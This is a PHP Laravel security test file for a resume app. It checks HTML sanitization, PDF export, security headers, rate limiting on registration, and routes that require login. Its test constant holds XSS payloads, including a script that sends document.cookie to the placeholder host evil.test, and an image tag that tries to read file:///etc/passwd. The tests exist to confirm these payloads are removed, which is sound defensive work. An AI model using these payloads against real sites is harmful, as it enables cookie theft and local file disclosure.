<?php

namespace Tests\Feature;

use App\Models\User;
use App\Services\ResumeTemplate;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class SecurityTest extends TestCase
{
    use RefreshDatabase;

    private const ATTACK = '<h1 style="text-align: center; background: url(javascript:alert(1))" onclick="steal()">Fulano</h1>'
        .'<script>fetch("https://evil.test?c="+document.cookie)</script><img src=x onerror=alert(1)>'
        .'<p><a href="javascript:alert(1)">clique</a> <span style="color: #ff0000; position: fixed">texto</span></p>'
        .'<iframe src="https://evil.test"></iframe><svg onload=alert(1)><circle/></svg>';

    public function test_sanitizer_keeps_formatting_and_removes_everything_dangerous(): void
    {
        $clean = ResumeTemplate::sanitize(self::ATTACK);

        $this->assertSame('<h1 style="text-align: center">Fulano</h1><p>clique <span style="color: #ff0000">texto</span></p>', $clean);
    }

    public function test_html_posted_directly_to_save_endpoint_is_sanitized(): void
    {
        $user = User::factory()->create();

        $this->actingAs($user)->putJson(route('resume.update'), ['html' => self::ATTACK])->assertOk();

        $html = $user->fresh()->resume->html;
        $this->assertStringNotContainsString('script', $html);
        $this->assertStringNotContainsString('onclick', $html);
        $this->assertStringNotContainsString('javascript', $html);
        $this->assertStringNotContainsString('iframe', $html);
    }

    public function test_export_does_not_render_injected_html(): void
    {
        $response = $this->actingAs(User::factory()->create())->post(route('export.pdf'), ['html' => self::ATTACK.'<img src="file:///etc/passwd">']);

        $response->assertOk();
        $this->assertStringStartsWith('%PDF', $response->getContent());
    }

    public function test_security_headers_are_sent(): void
    {
        $this->get('/')->assertOk()
            ->assertHeader('X-Frame-Options', 'SAMEORIGIN')
            ->assertHeader('X-Content-Type-Options', 'nosniff')
            ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    }

    public function test_registration_is_rate_limited(): void
    {
        for ($i = 0; $i < 6; $i++) {
            $this->post('/register', ['name' => 'x', 'email' => "spam$i@example.com", 'password' => 'curta', 'password_confirmation' => 'curta']);
        }

        $this->post('/register', ['name' => 'x', 'email' => 'spam7@example.com', 'password' => 'curta', 'password_confirmation' => 'curta'])
            ->assertStatus(429);
    }

    public function test_pages_require_login(): void
    {
        foreach (['/curriculos', '/curriculo', '/candidaturas', '/conectar-ia', '/conta/meus-dados'] as $url) {
            $this->get($url)->assertRedirect('/login');
        }
    }
}
